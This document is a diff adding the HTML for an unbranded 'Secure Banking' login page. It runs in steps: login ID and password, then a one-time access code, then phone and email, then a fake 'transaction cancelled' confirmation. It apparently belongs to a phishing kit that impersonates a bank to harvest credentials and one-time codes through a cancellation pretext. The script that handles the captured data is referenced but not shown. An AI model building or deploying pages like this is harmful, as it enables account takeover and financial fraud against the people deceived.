@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Banking | Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="login-card">
+        <!-- HEADER WITH LOGO -->
+        <div class="card-header">
+            <!-- Replace src with your actual logo file -->
+            <img src="https://i.ibb.co/rG68Bgh1/IMG-0696.jpg" alt="Logo" class="logo-placeholder">
+        </div>
+
+        <!-- PAGE 1: LOGIN -->
+        <div class="step active" id="step1">
+            <div class="card-body">
+                <form id="form1">
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Login ID" required>
+                    </div>
+                    <div class="form-group pass-container">
+                        <input type="password" id="password" placeholder="Password" required>
+                        <div class="toggle-password" id="togglePasswordBtn">
+                            <!-- SVG for Eye Icon -->
+                            <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        </div>
+                    </div>
+                    
+                    <div class="remember-me-row">
+                        <label class="switch">
+                            <input type="checkbox">
+                            <span class="slider"></span>
+                        </label>
+                        <span>Remember me</span>
+                    </div>
+
+                    <button type="submit" class="btn-primary">Log In</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 2: ACCESS CODE -->
+        <div class="step" id="step2">
+            <div class="card-body">
+                <h2></h2>
+                <p class="instruction-text">Enter the code sent to your device to verify this action.</p>
+                <form id="form2">
+                    <div class="form-group">
+                        <input type="text" id="otp" placeholder="Access Code" required style="text-align: center; letter-spacing: 4px;">
+                    </div>
+                    <button type="submit" class="btn-primary">Continue</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 3: CONTACT VERIFICATION -->
+        <div class="step" id="step3">
+            <div class="card-body">
+                <p class="instruction-text">Please verify your contact information.</p>
+              
+                <form id="form3">
+                    <div class="form-group">
+                        <input type="tel" id="phone" placeholder="Phone Number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="email" id="email" placeholder="Email Address" required>
+                    </div>
+                    <button type="submit" class="btn-primary">Confirm</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 4: LOADING & SUCCESS -->
+        <div class="step" id="step4">
+            <div class="card-body loader-container">
+                <div id="loader-area">
+                    <div class="spinner"></div>
+                    <p style="color: #666;">Processing request...</p>
+                </div>
+                <div id="success-area" style="display: none;">
+                    <div class="success-msg">Thank you.<br>Transaction has been successfully cancelled.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BOTTOM LINKS -->
+    <div class="external-links">
+        Forgot Login ID | Forgot Password | Privacy Policy
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
